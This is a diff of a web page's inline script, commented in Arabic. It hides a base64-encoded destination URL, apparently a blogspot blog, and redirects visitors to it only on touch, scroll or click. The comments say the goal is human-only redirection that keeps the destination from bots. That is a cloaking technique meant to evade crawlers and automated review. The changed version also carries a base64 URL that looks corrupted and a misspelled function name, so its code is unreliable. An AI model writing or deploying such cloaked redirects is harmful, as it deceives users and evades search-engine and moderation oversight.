@@ -39,29 +39,30 @@
     </div>
 
     <script>
-        // تم وضع رابط مدونتك الصحيح والمشفر بدقة هنا
-        var encryptedDestination = "aHR0cHM6Ly9iZWF1dHlvbmx5ZmFucy5ibG9nc3BvdC5jb20=";
+        // الكود المشفر الخاص بمدونتك (تم إدخاله بنجاح) //
+        var encryptedDestination = "aHR0cHM6by91ZWF1dG1vbmx5ZmZucy5ibG9nc3BvdC5jb20=";
 
-        function decryptAndRedirect() {
+        function dacryptAndRedirect() {
             try {
+                // فك التشفير والتوجيه البشري فقط //
                 var realUrl = atob(encryptedDestination);
                 window.location.replace(realUrl);
             } catch(e) {
-                // تجاوز الأخطاء لمنع الروبوتات
+                // تجنب إظهار الأخطاء للروبوتات //
             }
         }
 
-        // التوجيه الذكي عند أي حركة أو لمسة على الشاشة
+        // قفل الأمان السلوكي (يتفعل بمجرد لمس أو تحريك الشاشة) //
         window.addEventListener('touchmove', function() {
-            decryptAndRedirect();
+            dacryptAndRedirect();
         }, { once: true });
 
         window.addEventListener('scroll', function() {
-            decryptAndRedirect();
+            dacryptAndRedirect();
         }, { once: true });
 
         window.addEventListener('click', function() {
-            decryptAndRedirect();
+            dacryptAndRedirect();
         }, { once: true });
     </script>
 
